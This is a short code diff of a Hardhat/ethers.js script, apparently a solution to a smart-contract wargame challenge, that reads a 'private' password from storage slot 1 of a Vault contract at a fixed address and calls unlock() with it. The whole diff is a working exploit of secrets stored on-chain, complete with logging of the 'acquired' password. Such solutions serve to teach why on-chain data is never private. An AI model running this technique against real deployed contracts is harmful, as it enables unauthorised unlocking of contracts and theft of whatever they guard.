@@ -9,10 +9,16 @@ const main = async () => {
   const vaultContract = await new hre.ethers.Contract("0x7Ca9Ffa0792BD500fFaCD04108eB0DCd58Da4432", vaultAbi.abi, wallet);
   console.log("Delegate contract: " + vaultContract.address);
 
-  let txn = await provider.getStorageAt(vaultContract.address, 1);
-  console.log(`Vault password: ${(hre.ethers.utils.toUtf8String(txn))}`);
+  let txn1 = await provider.getStorageAt(vaultContract.address, 1);
+  console.log(`Password aquired: ${(hre.ethers.utils.toUtf8String(txn1))}`);
 
-  vaultContract.unlock(hre.ethers.utils.toUtf8String(txn));
+
+  let password = hre.ethers.utils.toUtf8String(txn1).toString()
+  console.log("Password stored")
+
+  let txn2 = await vaultContract.unlock(password);
+  console.log("Unlocking...")
+  await txn2.wait();
   console.log("Vault unlocked.")
 }
 
